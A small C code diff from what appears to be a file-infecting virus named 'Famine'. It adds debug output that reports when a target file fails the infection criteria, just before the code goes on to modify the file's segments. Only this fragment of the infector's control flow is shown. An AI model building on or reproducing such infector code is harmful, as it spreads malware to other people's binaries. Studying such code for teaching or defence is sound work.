@@ -65,7 +65,17 @@ void famine(const char *file, const size_t m_entry)
 	for (uint8_t index = 0; index < CRITERIA_SIZE; index++)
 	{
 		if (crit[index].fct(header) == false)
+		{
+#if DEBUG
+			char fam[] = "\033[0;31mFamine\033[0m: ";
+			char des[] = " can't be infected\n\n";
+
+			_write(1, fam, _strlen(fam)); 
+			_write(1, info.name, _strlen(info.name));
+			_write(1, des, _strlen(des)); 
+#endif
 			return ;
+		}
 	}
 
 	modify_segment(&info);
